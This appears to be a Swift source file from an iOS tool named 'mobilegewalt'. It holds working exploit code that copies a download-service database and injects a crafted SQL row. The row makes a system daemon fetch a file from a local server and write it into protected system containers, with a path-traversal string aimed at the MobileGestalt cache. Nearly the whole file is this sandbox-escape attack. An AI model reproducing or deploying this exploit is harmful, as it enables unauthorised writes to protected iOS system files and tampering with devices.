//
//  kraft.swift
//  mobilegewalt
//
//  Created by ruter on 18.11.25.
//

import SQLite3
import UIKit
import Combine
import Foundation
import ZIPFoundation
import UniformTypeIdentifiers

let booksuuid = "68A0EEF9-206E-4ADF-A10C-E2D1BB689B5D"
let server = "http://localhost:\(freeport)"
let path = "../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library"

func kraftdl28() {
    guard let dburl = Bundle.main.url(forResource: "downloads.28", withExtension: "sqlitedb") else {
        globallogger.log("[ - ] could not find downloads.28.sqlitedb in bundle")
        return
    }

    let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
    let writeabledb = docs.appendingPathComponent("downloads.28.sqlitedb")

    globallogger.log("[ + ] copying db!")
    do {
        if FileManager.default.fileExists(atPath: writeabledb.path) {
            try FileManager.default.removeItem(at: writeabledb)
        }
        try FileManager.default.copyItem(at: dburl, to: writeabledb)
        globallogger.log("[ i ] copied db!")
    } catch {
        globallogger.log("[ - ] failed to copy db: \(error)")
        return
    }

    var db: OpaquePointer?

    globallogger.log("[ + ] opening db")
    if sqlite3_open(writeabledb.path, &db) == SQLITE_OK {
        globallogger.log("[ i ] opened db!")
        let pid = Int64.random(in: 1_000_000_000...9_223_372_036_854_775_807)

        let sql = """
        INSERT INTO "main"."asset" ("pid", "download_id", "asset_order", "asset_type", "bytes_total", "url", "local_path", "destination_url", "path_extension", "retry_count", "http_method", "initial_odr_size", "is_discretionary", "is_downloaded", "is_drm_free", "is_external", "is_hls", "is_local_cache_server", "is_zip_streamable", "processing_types", "video_dimensions", "timeout_interval", "store_flavor", "download_token", "blocked_reason", "avfoundation_blocked", "service_type", "protection_type", "store_download_key", "etag", "bytes_to_hash", "hash_type", "server_guid", "file_protection", "variant_id", "hash_array", "http_headers", "request_parameters", "body_data", "body_data_file_path", "sinfs_data", "dpinfo_data", "uncompressed_size", "url_session_task_id") VALUES (\(pid), 6936249076851270150, 0, 'media', NULL, '\(server)/BLDatabaseManager.sqlite', '/private/var/containers/Shared/SystemGroup/\(booksuuid)/Documents/BLDatabaseManager/BLDatabaseManager.sqlite', NULL, 'epub', 6, 'GET', NULL, 0, 0, 0, 1, 0, 0, 0, 0, NULL, 60, NULL, 466440000, 0, 0, 0, 0, '', NULL, NULL, 0, NULL, NULL, NULL, X'62706c6973743030a1015f10203661383338316461303164646263393339653733643131303036326266633566080a000000000000010100000000000000020000000000000000000000000000002d', NULL, NULL, NULL, NULL, NULL, NULL, 0, 1);
        """

        if sqlite3_exec(db, sql, nil, nil, nil) != SQLITE_OK {
            let errmsg = String(cString: sqlite3_errmsg(db)!) // might crash idrc
            globallogger.log("[ - ] insert failed: \(errmsg)")
            globallogger.divider()
        } else {
            globallogger.log("[ i ] insert successful!")
            globallogger.divider()
        }

        sqlite3_close(db)
    } else {
        globallogger.log("[ - ] failed to open db")
        globallogger.divider()
    }
}
